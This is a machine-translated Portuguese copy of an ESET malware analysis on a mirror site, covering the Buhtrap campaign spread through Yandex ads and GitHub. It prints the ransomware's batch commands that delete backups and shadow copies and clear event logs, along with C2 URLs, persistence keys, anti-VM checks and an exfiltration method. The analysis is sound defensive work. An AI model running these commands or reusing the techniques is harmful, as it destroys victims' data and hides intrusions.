<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëÇüèº üåè ‚úÇÔ∏è O backdoor e o criptografador Buhtrap foram distribu√≠dos usando o Yandex.Direct ü§õüèº üîã üòù</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Para direcionar um ataque cibern√©tico a contadores, voc√™ pode usar os documentos de trabalho que eles est√£o procurando na rede. Por exemplo, nos √∫ltim...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>O backdoor e o criptografador Buhtrap foram distribu√≠dos usando o Yandex.Direct</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/450126/"> Para direcionar um ataque cibern√©tico a contadores, voc√™ pode usar os documentos de trabalho que eles est√£o procurando na rede.  Por exemplo, nos √∫ltimos meses, um grupo cibern√©tico est√° operando que distribui os conhecidos backdoors <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Buhtrap</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">RTM</a> , al√©m de criptografadores e software para roubar criptomoedas.  A maioria dos alvos est√° localizada na R√∫ssia.  O ataque √© implementado colocando an√∫ncios maliciosos no Yandex.Direct.  As poss√≠veis v√≠timas foram a um site onde foram solicitadas a baixar um arquivo malicioso disfar√ßado de modelo de documento.  Yandex removeu an√∫ncios maliciosos ap√≥s nosso aviso. <br><br>  O c√≥digo fonte do Buhtrap foi fundido na rede no passado, para que qualquer pessoa possa us√°-lo.  N√£o temos informa√ß√µes sobre a disponibilidade do c√≥digo RTM. <br><br>  Em uma postagem, mostraremos como os atacantes distribu√≠ram malware usando o Yandex.Direct e o hospedaram no GitHub.  O post ser√° preenchido por uma an√°lise t√©cnica dos malvari. <br><br><img src="https://habrastorage.org/webt/y3/h0/ly/y3h0lyhh0aq4jl6dwpvaia-vf2q.png"><br><br><a name="habracut"></a><h2>  Buhtrap e RTM de volta aos neg√≥cios </h2><br><h4>  Mecanismo de distribui√ß√£o e v√≠timas </h4><br>  As v√°rias cargas √∫teis entregues √†s v√≠timas s√£o unidas por um mecanismo de distribui√ß√£o comum.  Todos os arquivos maliciosos criados por cibercriminosos estavam localizados em dois reposit√≥rios diferentes do GitHub. <br><br>  Normalmente, no reposit√≥rio havia um arquivo malicioso baixado, que costumava mudar.  Como voc√™ pode ver o hist√≥rico de altera√ß√µes no reposit√≥rio no GitHub, podemos ver que tipo de malware se espalhou durante um determinado per√≠odo.  Para convencer a v√≠tima a baixar o arquivo malicioso, foi usado o site blanki-shabloni24 [.] Ru, mostrado na figura acima. <br><br>  O design do site e todos os nomes dos arquivos maliciosos s√£o consistentes em um √∫nico conceito - formul√°rios, modelos, contratos, amostras, etc. Dado que, no passado, o Buhtrap e o software RTM j√° eram usados ‚Äã‚Äãem ataques a contadores, assumimos que a estrat√©gia √© a mesma na nova campanha.  A √∫nica quest√£o √© como a v√≠tima chegou ao local dos agressores. <br><br><h4>  Infec√ß√£o </h4><br>  Pelo menos algumas v√≠timas em potencial neste site foram atra√≠das por publicidade maliciosa.  A seguir, √© apresentado um exemplo de URL: <br><br> <code>https://blanki-shabloni24.ru/?utm_source=yandex&amp;utm_medium=banner&amp;utm_campaign=cid|{blanki_rsya}|context&amp;utm_content=gid|3590756360|aid|6683792549|15114654950_&amp;utm_term=  &amp;pm_source=bb.f2.kz&amp;pm_block=none&amp;pm_position=0&amp;yclid=1029648968001296456</code> <br> <br>  Como voc√™ pode ver no link, o banner foi postado no f√≥rum leg√≠timo de contabilidade bb.f2 [.] Kz.  √â importante observar que os banners apareceram em sites diferentes, todos tiveram o mesmo ID de campanha (blanki_rsya) e a maioria relacionada a servi√ßos de contabilidade ou assist√™ncia jur√≠dica.  Pode ser visto no URL que a v√≠tima em potencial usou o pedido "formul√°rio da conta de download", o que refor√ßa nossa hip√≥tese sobre ataques direcionados.  Listados abaixo est√£o os sites onde os banners e pesquisas relacionadas apareceram. <br><br><ul><li>  baixar formul√°rio da conta - bb.f2 [.] kz </li><li>  contrato de amostra - Ipopen [.] en </li><li>  amostra de reclama√ß√£o de declara√ß√£o - 77metrov [.] ru </li><li>  formul√°rio de contrato - blank-dogovor-kupli-prodazhi [.] pt </li><li>  amostra da peti√ß√£o - zen.yandex [.] ru </li><li>  amostra de reclama√ß√£o - quarta-feira [.] </li><li>  modelos de contrato de amostra - Regforum [.] </li><li>  formul√°rio de contrato - assistentus [.] </li><li>  exemplo de contrato de apartamento - napravah [.] com </li><li>  amostras de contratos legais - avito [.] ru </li></ul><br>  O site blanki-shabloni24 [.] Ru pode ter sido configurado para passar por uma avalia√ß√£o visual simples.  Como regra, a publicidade que leva a um site de apar√™ncia profissional com um link para o GitHub n√£o parece algo obviamente ruim.  Al√©m disso, os invasores carregaram arquivos maliciosos no reposit√≥rio apenas por um per√≠odo limitado, provavelmente durante a campanha.  A maior parte do reposit√≥rio no GitHub era um arquivo zip vazio ou um arquivo exe limpo.  Assim, os atacantes poderiam distribuir publicidade atrav√©s do Yandex.Direct em sites que provavelmente eram visitados por contadores que vinham para consultas de pesquisa espec√≠ficas. <br><br>  Em seguida, considere as v√°rias cargas √∫teis distribu√≠das dessa maneira. <br><br><h2>  An√°lise de carga √∫til </h2><br><h4>  Cronograma de distribui√ß√£o </h4><br>  A campanha de malware come√ßou no final de outubro de 2018 e est√° ativa no momento da reda√ß√£o da postagem.  Como todo o reposit√≥rio estava dispon√≠vel publicamente no GitHub, compilamos uma cronologia precisa da distribui√ß√£o de seis fam√≠lias de malware diferentes (veja a figura abaixo).  Adicionamos uma linha mostrando o momento em que um link do banner foi detectado, de acordo com a telemetria da ESET, para compara√ß√£o com o hist√≥rico do git.  Como voc√™ pode ver, isso se correlaciona bem com a disponibilidade da carga √∫til no GitHub.  A discrep√¢ncia no final de fevereiro pode ser explicada por nossa falta de parte do hist√≥rico de altera√ß√µes, pois o reposit√≥rio foi exclu√≠do do GitHub antes que pud√©ssemos obt√™-lo completamente. <br><br><img src="https://habrastorage.org/webt/sa/ua/1i/saua1i6vupxtv2pa-tvwawje8em.png"><br>  <i>Figura 1. Cronologia da distribui√ß√£o de malvari.</i> <br><br><h4>  Certificados de assinatura de certificado </h4><br>  A campanha usou muitos certificados.  Alguns assinaram mais de uma fam√≠lia de malware, o que indica adicionalmente que amostras diferentes pertencem √† mesma campanha.  Apesar da disponibilidade da chave privada, os operadores n√£o assinaram os arquivos bin√°rios sistematicamente e n√£o usaram a chave para todas as amostras.  No final de fevereiro de 2019, os atacantes come√ßaram a criar assinaturas inv√°lidas usando um certificado de propriedade do Google, para o qual eles n√£o t√™m uma chave privada. <br><br>  Todos os certificados envolvidos na campanha e as fam√≠lias Malvari que assinam est√£o listados na tabela abaixo. <br><br><img src="https://habrastorage.org/webt/wg/q_/-8/wgq_-807r6mtilzeam28lhbbrvi.png"><br><br>  Tamb√©m usamos esses certificados de assinatura de c√≥digo para se comunicar com outras fam√≠lias de malware.  Para a maioria dos certificados, n√£o encontramos amostras que n√£o seriam distribu√≠das pelo reposit√≥rio GitHub.  No entanto, o certificado TOV ‚ÄúMARIYA‚Äù foi usado para assinar o Malvari, de propriedade da <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">botnet</a> Wauchos, adware e mineradores.  √â improv√°vel que este malware esteja associado a esta campanha.  Provavelmente, o certificado foi comprado na darknet. <br><br><h4>  Win32 / Filecoder.Buhtrap </h4><br>  O primeiro componente que chamou nossa aten√ß√£o foi o primeiro Win32 / Filecoder.Buhtrap descoberto.  Este √© um arquivo bin√°rio Delphi que √†s vezes pode ser empacotado.  Foi distribu√≠do principalmente entre fevereiro e mar√ßo de 2019.  Ele se comporta como deveria em um programa de ransomware - ele procura discos locais e pastas de rede e criptografa os arquivos detectados.  Para comprometer, ele n√£o precisa de uma conex√£o com a Internet, pois n√£o entra em contato com o servidor para enviar chaves de criptografia.  Em vez disso, ele adiciona um "token" no final da mensagem de recompra e sugere o uso de email ou Bitmessage para se comunicar com os operadores. <br><br>  Para criptografar o maior n√∫mero poss√≠vel de recursos importantes, o Filecoder.Buhtrap lan√ßa um fluxo projetado para desligar o software chave, que pode ter manipuladores de arquivos abertos com informa√ß√µes valiosas, que podem interferir na criptografia.  Os processos de destino s√£o principalmente sistemas de gerenciamento de banco de dados (DBMS).  Al√©m disso, o Filecoder.Buhtrap exclui arquivos de log e backups para dificultar a recupera√ß√£o de dados.  Para fazer isso, o script em lotes abaixo √© executado. <br><br> <code>bcdedit /set {default} bootstatuspolicy ignoreallfailures <br> bcdedit /set {default} recoveryenabled no <br> wbadmin delete catalog -quiet <br> wbadmin delete systemstatebackup <br> wbadmin delete systemstatebackup -keepversions:0 <br> wbadmin delete backup <br> wmic shadowcopy delete <br> vssadmin delete shadows /all /quiet <br> reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f <br> reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f <br> reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" <br> attrib "%userprofile%\documents\Default.rdp" -s -h <br> del "%userprofile%\documents\Default.rdp" <br> wevtutil.exe clear-log Application <br> wevtutil.exe clear-log Security <br> wevtutil.exe clear-log System <br> sc config eventlog start=disabled</code> <br> <br>  O Filecoder.Buhtrap usa o IP Logger de servi√ßo online leg√≠timo, criado para coletar informa√ß√µes sobre os visitantes do site.  O objetivo √© rastrear as v√≠timas do codificador, pelas quais a linha de comando √© respons√°vel: <br><br> <code>mshta.exe "javascript:document.write('');"</code> <br> <br>  Os arquivos para criptografia s√£o selecionados em caso de incompatibilidade nas tr√™s listas de exce√ß√µes.  Em primeiro lugar, os arquivos com as seguintes extens√µes n√£o s√£o criptografados: .com, .cmd, .cpl, .dll, .exe, .hta, .lnk, .msc, .msi, .msp, .pif, .scr, .sys e .bat.  Em segundo lugar, todos os arquivos para os quais o caminho completo cont√©m linhas de diret√≥rio da lista abaixo s√£o exclu√≠dos. <br><br> <code>\.{ED7BA470-8E54-465E-825C-99712043E01C}\ <br> \tor browser\ <br> \opera\ <br> \opera software\ <br> \mozilla\ <br> \mozilla firefox\ <br> \internet explorer\ <br> \google\chrome\ <br> \google\ <br> \boot\ <br> \application data\ <br> \apple computer\safari\ <br> \appdata\ <br> \all users\ <br> :\windows\ <br> :\system volume information\ <br> :\nvidia\ <br> :\intel\</code> <br> <br>  Em terceiro lugar, certos nomes de arquivos tamb√©m s√£o exclu√≠dos da criptografia, entre eles o nome do arquivo de mensagens com um pedido de resgate.  A lista √© apresentada abaixo.  Obviamente, todas essas exce√ß√µes foram projetadas para preservar a capacidade de iniciar a m√°quina, mas com sua usabilidade m√≠nima. <br><br> <code>boot.ini <br> bootfont.bin <br> bootsect.bak <br> desktop.ini <br> iconcache.db <br> ntdetect.com <br> ntldr <br> ntuser.dat <br> ntuser.dat.log <br> ntuser.ini <br> thumbs.db <br> winupas.exe <br> your files are now encrypted.txt <br> windows update assistant.lnk <br> master.exe <br> unlock.exe <br> unlocker.exe</code> <br> <br><h4>  Esquema de criptografia de arquivos </h4><br>  Uma vez iniciado, o malware gera um par de chaves RSA de 512 bits.  O expoente privado (d) e o m√≥dulo (n) s√£o ent√£o criptografados usando uma chave p√∫blica de 2048 bits codificada (expoente p√∫blico e m√≥dulo), agrupada em zlib e codificada em base64.  O c√≥digo respons√°vel por isso √© mostrado na Figura 2. <br><br><img src="https://habrastorage.org/webt/c_/p_/g9/c_p_g9rfnoggxyffe9jedxgibrk.png"><br>  <i>Figura 2. O resultado da decompila√ß√£o Hex-Rays do processo de gera√ß√£o de um par de chaves RSA de 512 bits.</i> <br><br>  A seguir, √© apresentado um exemplo de texto sem formata√ß√£o com uma chave privada gerada, que √© um token anexado √† mensagem de resgate. <br><br> <code>DF9228F4F3CA93314B7EE4BEFC440030665D5A2318111CC3FE91A43D781E3F91BD2F6383E4A0B4F503916D75C9C576D5C2F2F073ADD4B237F7A2B3BF129AE2F399197ECC0DD002D5E60C20CE3780AB9D1FE61A47D9735036907E3F0CF8BE09E3E7646F8388AAC75FF6A4F60E7F4C2F697BF6E47B2DBCDEC156EAD854CADE53A239</code> <br> <br>  A chave p√∫blica dos atacantes √© mostrada abaixo. <br><br> <code>e = 0x72F750D7A93C2C88BFC87AD4FC0BF4CB45E3C55701FA03D3E75162EB5A97FDA7ACF8871B220A33BEDA546815A9AD9AA0C2F375686F5009C657BB3DF35145126C71E3C2EADF14201C8331699FD0592C957698916FA9FEA8F0B120E4296193AD7F3F3531206608E2A8F997307EE7D14A9326B77F1B34C4F1469B51665757AFD38E88F758B9EA1B95406E72B69172A7253F1DFAA0FA02B53A2CC3A7F0D708D1A8CAA30D954C1FEAB10AD089EFB041DD016DCAAE05847B550861E5CACC6A59B112277B60AC0E4E5D0EA89A5127E93C2182F77FDA16356F4EF5B7B4010BCCE1B1331FCABFFD808D7DAA86EA71DFD36D7E701BD0050235BD4D3F20A97AAEF301E785005 <br> n = 0x212ED167BAC2AEFF7C3FA76064B56240C5530A63AB098C9B9FA2DE18AF9F4E1962B467ABE2302C818860F9215E922FC2E0E28C0946A0FC746557722EBB35DF432481AC7D5DDF69468AF1E952465E61DDD06CDB3D924345A8833A7BC7D5D9B005585FE95856F5C44EA917306415B767B684CC85E7359C23231C1DCBBE714711C08848BEB06BD287781AEB53D94B7983EC9FC338D4320129EA4F568C410317895860D5A85438B2DA6BB3BAAE9D9CE65BCEA6760291D74035775F28DF4E6AB1A748F78C68AB07EA166A7309090202BB3F8FBFC19E44AC0B4D3D0A37C8AA5FA90221DA7DB178F89233E532FF90B55122B53AB821E1A3DB0F02524429DEB294B3A4EDD</code> <br> <br>  Os arquivos s√£o criptografados usando o AES-128-CBC com uma chave de 256 bits.  Para cada arquivo criptografado, uma nova chave e um novo vetor de inicializa√ß√£o s√£o gerados.  As principais informa√ß√µes s√£o adicionadas ao final do arquivo criptografado.  Considere o formato de arquivo criptografado. <br>  Os arquivos criptografados t√™m o seguinte cabe√ßalho: <br><br><img src="https://habrastorage.org/webt/lo/-e/7m/lo-e7mo1l2ta7ie0n2rlz0ybirs.png"><br><br>  Os dados do arquivo de origem com a adi√ß√£o do valor m√°gico do VEGA s√£o criptografados at√© os primeiros 0x5000 bytes.  Todas as informa√ß√µes para descriptografia s√£o anexadas a um arquivo com a seguinte estrutura: <br><br><img src="https://habrastorage.org/webt/iw/hy/az/iwhyaz2vw5c45i6vk0s4hs_sadq.png"><br><br>  - O marcador de tamanho do arquivo cont√©m um r√≥tulo indicando se o arquivo √© maior que 0x5000 bytes <br>  - Blob de chave AES = ZlibCompress (RSAEncrypt (chave AES + IV, chave p√∫blica do par de chaves RSA gerado) <br>  - Blob de chave RSA = ZlibCompress (RSAEncrypt (chave privada RSA gerada, chave p√∫blica RSA codificada)) <br><br><h4>  Win32 / ClipBanker </h4><br>  O Win32 / ClipBanker √© um componente distribu√≠do de forma intermitente do final de outubro ao in√≠cio de dezembro de 2018.  Seu papel √© rastrear o conte√∫do da √°rea de transfer√™ncia, procurar os endere√ßos das carteiras de criptomoedas.  Ap√≥s determinar o endere√ßo da carteira de destino, o ClipBanker substitui-o pelo endere√ßo supostamente pertencente aos operadores.  As amostras que estudamos n√£o foram empacotadas nem ofuscadas.  O √∫nico mecanismo usado para mascarar o comportamento √© a criptografia de cadeias.  Os endere√ßos das carteiras dos operadores s√£o criptografados usando o RC4.  Alvo de criptomoedas - Bitcoin, Bitcoin cash, Dogecoin, Ethereum e Ripple. <br><br>  Durante o per√≠odo de distribui√ß√£o de malware, uma pequena quantidade foi enviada ao MTC para as carteiras Bitcoin do atacante, o que lan√ßa d√∫vidas sobre o sucesso da campanha.  Al√©m disso, n√£o h√° raz√£o para supor que essas transa√ß√µes geralmente estejam relacionadas ao ClipBanker. <br><br><h4>  Win32 / RTM </h4><br>  O componente Win32 / RTM foi distribu√≠do por v√°rios dias no in√≠cio de mar√ßo de 2019.  O RTM √© um banqueiro Trojan baseado em Delphi, destinado a sistemas banc√°rios remotos.  Em 2017, os pesquisadores da ESET publicaram uma <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">an√°lise detalhada</a> deste programa, a descri√ß√£o ainda √© relevante.  Em janeiro de 2019, a Palo Alto Networks tamb√©m divulgou <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">um post sobre o RTM</a> . <br><br><h4>  Buhtrap downloader </h4><br>  Por algum tempo, um downloader estava dispon√≠vel no GitHub, ao contr√°rio das ferramentas anteriores do Buhtrap.  Vai para <code>https://94.100.18[.]67/RSS.php?&lt;some_id&gt;</code> na pr√≥xima etapa e a carrega diretamente na mem√≥ria.  Dois comportamentos do c√≥digo do segundo est√°gio podem ser distinguidos.  No primeiro URL, o RSS.php passou o backdoor do Buhtrap diretamente - esse backdoor √© muito semelhante ao dispon√≠vel ap√≥s o vazamento do c√≥digo-fonte. <br><br>  Curiosamente, vemos v√°rias campanhas com um backdoor Buhtrap e, presumivelmente, elas s√£o lideradas por diferentes operadores.  Nesse caso, a principal diferen√ßa √© que o backdoor √© carregado diretamente na mem√≥ria e n√£o usa o esquema usual com o processo de implanta√ß√£o da DLL, sobre o qual falamos <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">anteriormente</a> .  Al√©m disso, os operadores alteraram a chave RC4 usada para criptografar o tr√°fego de rede no servidor C&amp;C.  Na maioria das campanhas que vimos, os operadores n√£o se preocuparam em alterar essa chave. <br><br>  O segundo comportamento mais complexo - o URL RSS.php foi passado por outro carregador.  Ele implementou alguma ofusca√ß√£o, como a reconstru√ß√£o de uma tabela de importa√ß√£o din√¢mica.  O objetivo do carregador de inicializa√ß√£o √© entrar em contato com o servidor C&amp;C <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">msiofficeupd</a> [.] Com / api / F27F84EDA4D13B15 / 2, enviar logs e aguardar uma resposta.  Ele processa a resposta como um blob, carrega-a na mem√≥ria e executa.  A carga √∫til que vimos ao executar esse carregador era a mesma porta traseira do Buhtrap, mas pode haver outros componentes. <br><br><h4>  Android / Spy.Banker </h4><br>  Curiosamente, um componente para Android tamb√©m foi encontrado no reposit√≥rio GitHub.  Ele esteve no ramo principal por apenas um dia - 1 de novembro de 2018.  Al√©m de hospedada no GitHub, a telemetria da ESET n√£o encontra evid√™ncias da propaga√ß√£o desse malware. <br><br>  O componente foi hospedado como um pacote de aplicativos Android (APK).  Ele est√° muito ofuscado.  O comportamento malicioso est√° oculto no JAR criptografado localizado no APK.  √â RC4 criptografado com esta chave: <br><br> <code>key = [ <br> 0x87, 0xd6, 0x2e, 0x66, 0xc5, 0x8a, 0x26, 0x00, 0x72, 0x86, 0x72, 0x6f, <br> 0x0c, 0xc1, 0xdb, 0xcb, 0x14, 0xd2, 0xa8, 0x19, 0xeb, 0x85, 0x68, 0xe1, <br> 0x2f, 0xad, 0xbe, 0xe3, 0xb9, 0x60, 0x9b, 0xb9, 0xf4, 0xa0, 0xa2, 0x8b, 0x96 <br> ]</code> <br> <br>  A mesma chave e algoritmo s√£o usados ‚Äã‚Äãpara criptografar seq√º√™ncias de caracteres.  JAR est√° localizado em <code>APK_ROOT + image/files</code> .  Os primeiros 4 bytes do arquivo cont√™m o comprimento do JAR criptografado, que come√ßa imediatamente ap√≥s o campo de comprimento. <br><br>  Ap√≥s descriptografar o arquivo, descobrimos que √© o Anubis - um banqueiro previamente <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">documentado</a> para Android.  O software malicioso possui as seguintes fun√ß√µes: <br><br><ul><li>  grava√ß√£o de microfone </li><li>  tirando screenshots </li><li>  obten√ß√£o de coordenadas GPS </li><li>  keylogger </li><li>  criptografia de dados do dispositivo e demanda de resgate </li><li>  spam </li></ul><br>  Curiosamente, o banqueiro usou o Twitter como um canal de comunica√ß√£o de backup para obter outro servidor C&amp;C.  A amostra analisada usou a conta @JohnesTrader, mas no momento da an√°lise ela j√° estava bloqueada. <br><br>  O banqueiro cont√©m uma lista de aplicativos direcionados em um dispositivo Android.  Tornou-se mais longo do que a lista obtida no estudo Sophos.  A lista cont√©m muitos aplicativos banc√°rios, programas de compras online, como Amazon e eBay, servi√ßos de criptomoeda. <br><br><h4>  MSIL / ClipBanker.IH </h4><br>  O √∫ltimo componente que foi distribu√≠do como parte desta campanha foi o execut√°vel .NET Windows, que apareceu em mar√ßo de 2019.  A maioria das vers√µes estudadas foi empacotada pelo ConfuserEx v1.0.0.  Como o ClipBanker, esse componente usa a √°rea de transfer√™ncia.  Seu objetivo √© uma ampla variedade de criptomoedas, al√©m de ofertas no Steam.  Al√©m disso, ele usa o servi√ßo IP Logger para roubar a chave WIF privada do Bitcoin. <br><br>  Mecanismos de prote√ß√£o <br>  Al√©m das vantagens que o ConfuserEx oferece na forma de combater depura√ß√£o, descarte e viola√ß√£o, o componente tem a capacidade de detectar produtos antiv√≠rus e m√°quinas virtuais. <br><br>  Para verificar o lan√ßamento em uma m√°quina virtual, o malware usa a linha de comando WMI interna do Windows (WMIC) para solicitar informa√ß√µes sobre o BIOS, a saber: <br><br> <code>wmic bios</code> <br> <br>  Em seguida, o programa analisa a sa√≠da do comando e procura por palavras-chave: VBOX, VirtualBox, XEN, qemu, bochs, VM. <br><br>  Para detectar produtos antiv√≠rus, o malware envia uma solicita√ß√£o WMI (Instrumenta√ß√£o de Gerenciamento do Windows) para a Central de Seguran√ßa do Windows usando a API <code>ManagementObjectSearcher</code> como mostrado abaixo.  Ap√≥s a decodifica√ß√£o da base64, a chamada fica assim: <br><br> <code>ManagementObjectSearcher('root\\SecurityCenter2', 'SELECT * FROM AntivirusProduct')</code> <br> <br><img src="https://habrastorage.org/webt/wb/xv/tv/wbxvtvcwmxo9w45kjramkqmcy-s.png"><br>  <i>Figura 3. O processo de determina√ß√£o de produtos antiv√≠rus.</i> <br><br>  Al√©m disso, o malware verifica se o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">CryptoClipWatcher</a> , uma ferramenta para prote√ß√£o contra ataques da √°rea de transfer√™ncia, est√° em execu√ß√£o e, se estiver em execu√ß√£o, interrompe todos os threads desse processo, desativando a prote√ß√£o. <br><br><h4>  Persist√™ncia </h4><br>  A vers√£o do malware que estudamos se copia para <code>%APPDATA%\google\updater.exe</code> e define o atributo "hidden" para o diret√≥rio do google.  Em seguida, altera o valor de <code>Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell</code> no registro do Windows e adiciona o caminho <code>updater.exe</code> .  Portanto, o malware ser√° executado sempre que um usu√°rio fizer login. <br><br><h4>  Comportamento malicioso </h4><br>  Como o ClipBanker, o malware monitora o conte√∫do da √°rea de transfer√™ncia e procura os endere√ßos das carteiras de criptomoeda e, quando a encontra, a substitui por um dos endere√ßos do operador.  Abaixo est√° uma lista de endere√ßos de destino com base no que foi encontrado no c√≥digo. <br><br> <code>BTC_P2PKH, BTC_P2SH, BTC_BECH32, BCH_P2PKH_CashAddr, BTC_GOLD, LTC_P2PKH, LTC_BECH32, LTC_P2SH_M, ETH_ERC20, XMR, DCR, XRP, DOGE, DASH, ZEC_T_ADDR, ZEC_Z_ADDR, STELLAR, NEO, ADA, IOTA, NANO_1, NANO_3, BANANO_1, BANANO_3, STRATIS, NIOBIO, LISK, QTUM, WMZ, WMX, WME, VERTCOIN, TRON, TEZOS, QIWI_ID, YANDEX_ID, NAMECOIN, B58_PRIVATEKEY, STEAM_URL</code> <br> <br>  Para cada tipo de endere√ßo, h√° uma express√£o regular correspondente.  O valor STEAM_URL √© usado para atacar o sistema Steam, como pode ser visto na express√£o regular, que √© usada para determinar no buffer: <br><br> <code>\b(https:\/\/|http:\/\/|)steamcommunity\.com\/tradeoffer\/new\/\?partner=[0-9]+&amp;token=[a-zA-Z0-9]+\b</code> <br> <br><h4>  Canal de Exfiltra√ß√£o </h4><br>  Al√©m de substituir os endere√ßos no buffer, o malware visa chaves WIF privadas das carteiras Bitcoin, Bitcoin Core e Electrum Bitcoin.  O programa usa o plogger.org como um canal de exfiltra√ß√£o para obter a chave privada WIF.  Para fazer isso, os operadores adicionam os dados da chave privada ao cabe√ßalho HTTP do agente do usu√°rio, conforme mostrado abaixo. <br><br><img src="https://habrastorage.org/webt/fz/xc/us/fzxcusdwmjnv8irew2lhlnlg7ss.png"><br>  <i>Figura 4. Console do IP Logger com sa√≠da.</i> <br><br>  Os operadores n√£o usaram o iplogger.org para filtrar carteiras.  Provavelmente, eles recorreram a um m√©todo diferente devido √† restri√ß√£o de 255 caracteres no campo <code>User-Agent</code> , exibido na interface da web do IP Logger.  Nas amostras estudadas, outro servidor para sa√≠da de dados foi armazenado na <code>DiscordWebHook</code> ambiente <code>DiscordWebHook</code> .  Surpreendentemente, essa vari√°vel de ambiente n√£o est√° atribu√≠da a nenhum lugar do c√≥digo.  Isso sugere que o malware ainda est√° em desenvolvimento e a vari√°vel √© atribu√≠da na m√°quina de teste do operador. <br><br>  H√° outro sinal de que o programa est√° em desenvolvimento.  O bin√°rio inclui dois URLs do iplogger.org e uma solicita√ß√£o √© enviada aos dois ao filtrar os dados.  Em uma solicita√ß√£o para um desses URLs, o valor no campo Referer √© precedido por "DEV /".  Tamb√©m encontramos uma vers√£o que n√£o foi compactada usando o ConfuserEx, o destinat√°rio desse URL se chama DevFeedbackUrl.  Com base no nome da vari√°vel de ambiente, acreditamos que as operadoras planejam usar o servi√ßo Discord leg√≠timo e seu sistema de intercepta√ß√£o da Web para roubar carteiras de criptomoedas. <br><br><h2>  Conclus√£o </h2><br>  Esta campanha √© um exemplo do uso de servi√ßos de publicidade leg√≠timos em ataques cibern√©ticos.  O esquema √© voltado para organiza√ß√µes russas, mas n√£o ficaremos surpresos ao ver esse ataque usando servi√ßos n√£o russos.  Para evitar comprometimentos, os usu√°rios devem ter confian√ßa na reputa√ß√£o da fonte do software baixado. <br><br>  Uma lista completa dos indicadores de comprometimento e atributos do MITRE ATT &amp; CK est√° dispon√≠vel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt450126/">https://habr.com/ru/post/pt450126/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt450116/index.html">Sistemas operacionais: tr√™s pe√ßas f√°ceis. Parte 5: Planejamento: fila de feedback multin√≠vel (tradu√ß√£o)</a></li>
<li><a href="../pt450118/index.html">Transmita a tela para v√°rios dispositivos pela rede</a></li>
<li><a href="../pt450120/index.html">Pesquise imagens semelhantes, analisando um √∫nico algoritmo</a></li>
<li><a href="../pt450122/index.html">Startup Digest: Genetics (janeiro a mar√ßo de 2019)</a></li>
<li><a href="../pt450124/index.html">Configurando mapas do OsmAnd da camada de mapa de calor do Strava</a></li>
<li><a href="../pt450128/index.html">Usando a √≥ptica Minolta AF (montagem A da Sony) nas modernas c√¢meras sem espelho da Sony</a></li>
<li><a href="../pt450130/index.html">As equipes sobrevivem ap√≥s o hackathon?</a></li>
